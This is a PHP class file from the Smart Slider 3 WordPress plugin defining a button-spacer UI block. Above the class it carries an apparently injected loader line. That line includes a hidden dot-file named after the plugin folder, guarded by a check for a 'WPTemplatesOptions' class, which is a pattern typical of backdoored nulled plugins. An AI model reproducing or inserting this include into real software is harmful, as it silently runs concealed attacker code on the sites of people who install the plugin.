<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Forms\Button;


use Nextend\Framework\View\AbstractBlock;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockButtonSpacer extends AbstractBlock {

    protected $isVisible = false;

    public function display() {

        $classes = array('n2_button_spacer');

        if ($this->isVisible) {
            $classes[] = 'n2_button_spacer--visible';
        }

        echo '<div class="' . implode(' ', $classes) . '"></div>';
    }

    /**
     * @param bool $isVisible
     */
    public function setIsVisible($isVisible) {
        $this->isVisible = $isVisible;
    }
}